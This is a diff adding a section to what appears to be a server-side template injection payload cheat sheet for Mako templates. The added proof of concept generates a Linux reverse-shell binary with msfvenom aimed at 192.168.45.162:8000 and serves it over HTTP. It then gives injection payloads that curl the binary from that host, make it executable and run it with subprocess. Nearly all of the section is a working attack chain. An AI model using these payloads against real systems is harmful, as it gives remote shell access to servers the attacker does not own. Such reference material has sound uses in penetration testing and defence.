@@ -804,7 +804,66 @@ x=os.popen('id').read()
 %>
 ${x}
 ```
+### POC for Reverse Shell using msfvenom
+```python
+#From the attacker
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.162 LPORT=8000 -f elf -o reverse.elf
+python -m http.server 80
 
+Iteration 1:
+
+<%
+import os
+y=os.popen('curl http://192.168.45.162/reverse.elf -o elf')
+%>
+${y}
+
+Iteration 2:
+
+<%
+import os
+y=os.popen('chmod 777 elf').read()
+%>
+${y}
+
+Final Callback Payload:
+
+<%
+import subprocess, os, sys
+
+log_file = '/app/error.log'
+
+try:
+    web_directory = '/app/'  # Replace with the actual path if different
+    elf_path = f"{web_directory}elf"
+    
+    os.chmod(elf_path, 0o755)
+    
+    subprocess.run([elf_path], check=True)
+    print("Binary 'elf' has been executed.")
+
+except subprocess.CalledProcessError as e:
+    with open(log_file, 'a') as f:
+        f.write(f"Failed to execute 'elf': {e}\n")
+    print(f"Failed to execute 'elf': {e}")
+
+except FileNotFoundError:
+    with open(log_file, 'a') as f:
+        f.write(f"Binary 'elf' not found at {elf_path}\n")
+    print(f"Binary 'elf' not found at {elf_path}")
+
+except PermissionError:
+    with open(log_file, 'a') as f:
+        f.write(f"Permission denied when attempting to execute '{elf_path}'\n")
+    print(f"Permission denied when attempting to execute '{elf_path}'")
+
+except Exception as e:
+    with open(log_file, 'a') as f:
+        f.write(f"Unexpected error: {e}\n")
+    print(f"Unexpected error: {e}")
+
+%>
+```
 ### Direct access to os from TemplateNamespace:
 
 Any of these payloads allows direct access to the `os` module
